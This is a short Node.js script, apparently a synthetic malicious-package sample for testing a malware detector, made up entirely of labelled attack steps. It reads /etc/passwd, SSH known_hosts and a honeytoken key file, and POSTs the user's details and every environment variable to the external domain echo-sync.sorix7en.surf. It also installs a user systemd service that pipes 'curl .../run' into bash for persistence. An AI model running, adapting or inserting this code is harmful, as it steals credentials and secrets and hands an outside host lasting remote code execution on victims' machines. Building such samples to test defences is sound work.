const dns = require('dns');
const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to exfiltration domain
dns.lookup('echo-sync.sorix7en.surf', () => {});

// Sensitive reads
try { fs.readFileSync('/etc/passwd', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.ssh/known_hosts', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.fake_api_key', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "env"'); } catch(e) {}

// POST exfiltration
const payload = JSON.stringify({ user: os.userInfo(), env: process.env });
try {
  const req = https.request({ hostname: 'echo-sync.sorix7en.surf', port: 443, path: '/telemetry', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(payload); req.end();
} catch(e) {}

// Persistence via systemd
try {
  const serviceDir = os.homedir() + '/.config/systemd/user/';
  fs.mkdirSync(serviceDir, { recursive: true });
  fs.writeFileSync(serviceDir + 'bridge-svc.service', '[Service]\nExecStart=/bin/bash -c "curl echo-sync.sorix7en.surf/run | bash"\n[Install]\nWantedBy=default.target\n');
} catch(e) {}
